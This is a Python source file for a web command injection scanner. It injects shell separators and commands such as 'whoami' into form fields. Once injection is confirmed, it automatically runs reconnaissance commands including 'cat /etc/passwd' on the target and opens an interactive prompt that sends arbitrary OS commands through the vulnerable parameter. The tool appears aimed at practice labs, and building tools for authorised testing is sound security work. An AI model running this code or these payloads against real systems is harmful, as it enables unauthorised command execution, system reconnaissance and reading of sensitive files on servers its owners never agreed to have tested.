import requests
from colorama import Fore, init
import re

init(autoreset=True)

class CommandInjectionScanner:
    SEPARATORS = [";", "|", "&&", "\n"]

    def __init__(self, session):
        self.session = session
        self.findings = []

    def _extract_output(self, html):
        match = re.search(r'<pre>(.*?)</pre>', html, re.DOTALL)
        if match:
            raw = match.group(1)
            clean = re.sub(r'<[^>]+>', '\n', raw).strip()
            return clean
        return None

    def detect(self, url, method, param_name, base_params):
        token = "CMDINJX_9f3a"
        for sep in self.SEPARATORS:
            payload = f"127.0.0.1{sep}echo {token}"
            test_params = base_params.copy()
            test_params[param_name] = payload
            try:
                if method == "post":
                    resp = self.session.post(url, data=test_params, timeout=15)
                else:
                    resp = self.session.get(url, params=test_params, timeout=15)
            except requests.exceptions.RequestException:
                continue

            if token not in resp.text:
                continue

            verify_params = base_params.copy()
            verify_params[param_name] = f"nonexistent_host_xyz|whoami"
            try:
                if method == "post":
                    verify_resp = self.session.post(url, data=verify_params, timeout=15)
                else:
                    verify_resp = self.session.get(url, params=verify_params, timeout=15)
            except requests.exceptions.RequestException:
                continue

            output = self._extract_output(verify_resp.text)
            username_pattern = re.search(
                r'\b(root|www-data|apache|nginx|nobody|daemon|[a-z][a-z0-9_-]{1,30})\b',
                output or ""
            )
            if username_pattern and "nonexistent_host_xyz" not in (output or ""):
                print(f"{Fore.RED}[!] Command injection CONFIRMED -> {url} "
                      f"param='{param_name}' separator='{sep}' "
                      f"verified as: '{username_pattern.group(1)}'")
                return {"separator": sep, "param": param_name,
                        "verified_user": username_pattern.group(1)}
        return None

    def run_command(self, url, method, param_name, base_params, cmd):
        payload = f"127.0.0.1 | {cmd}"
        test_params = base_params.copy()
        test_params[param_name] = payload
        try:
            if method == "post":
                resp = self.session.post(url, data=test_params, timeout=15)
            else:
                resp = self.session.get(url, params=test_params, timeout=15)
            return self._extract_output(resp.text)
        except requests.exceptions.RequestException:
            return None

    def exploit(self, url, method, param_name, base_params, separator):
        print(f"\n{Fore.CYAN}{'='*55}")
        print(f"{Fore.CYAN}   COMMAND INJECTION EXPLOITATION -> {url}")
        print(f"{Fore.CYAN}{'='*55}\n")

        auto_commands = {
            "whoami":          "web server process user",
            "id":              "full user/group context",
            "hostname":        "target hostname",
            "uname -a":        "OS and kernel version",
            "cat /etc/passwd": "local system users"
        }

        results = {}

        for cmd, description in auto_commands.items():
            output = self.run_command(url, method, param_name, base_params, cmd)
            if output:
                print(f"{Fore.RED}[+] {cmd:<22} -> {description}")
                for line in output.split('\n')[:5]:
                    if line.strip():
                        print(f"{Fore.YELLOW}    {line.strip()}")
                results[cmd] = output
            else:
                print(f"{Fore.YELLOW}[?] {cmd:<22} -> no output captured")

        # ── Interactive command prompt ────────────────────────
        print(f"\n{Fore.CYAN}{'='*55}")
        print(f"{Fore.CYAN}   INTERACTIVE COMMAND INJECTION")
        print(f"{Fore.CYAN}   Injecting into: {url}  param='{param_name}'")
        print(f"{Fore.CYAN}   Type OS commands. 'exit' to continue scan.")
        print(f"{Fore.CYAN}{'='*55}\n")

        while True:
            try:
                cmd = input(f"{Fore.RED}cmdi{Fore.WHITE}@{Fore.YELLOW}target{Fore.WHITE}> ").strip()
            except (KeyboardInterrupt, EOFError):
                print()
                break

            if not cmd:
                continue

            if cmd.lower() in ("exit", "quit", "q"):
                print(f"{Fore.CYAN}[*] Exiting interactive mode...")
                break

            output = self.run_command(url, method, param_name, base_params, cmd)
            if output:
                print(f"{Fore.WHITE}{output}")
                results[f"[interactive] {cmd}"] = output
            else:
                print(f"{Fore.YELLOW}[?] No output returned")

        return results

    def scan_all(self, discovered_forms):
        print(f"\n{Fore.CYAN}{'='*55}")
        print(f"{Fore.CYAN}   COMMAND INJECTION SCAN")
        print(f"{Fore.CYAN}{'='*55}\n")

        for url, forms in discovered_forms.items():
            for form in forms:
                method = form["method"]
                inputs = form["inputs"]
                base_params = {inp["name"]: inp.get("value", "test") for inp in inputs}

                for inp in inputs:
                    if inp["type"] in ("submit", "hidden") or "token" in inp["name"].lower():
                        continue

                    result = self.detect(url, method, inp["name"], base_params)

                    if result:
                        exploit_results = self.exploit(
                            url, method, result["param"],
                            base_params, result["separator"]
                        )
                        self.findings.append({
                            "type": "COMMAND_INJECTION",
                            "severity": "CRITICAL",
                            "url": url,
                            "parameter": result["param"],
                            "separator": result["separator"],
                            "verified_user": result.get("verified_user"),
                            "commands_executed": exploit_results
                        })

        print(f"\n{Fore.CYAN}[*] Command injection scan complete: "
              f"{len(self.findings)} finding(s)")
        return self.findings
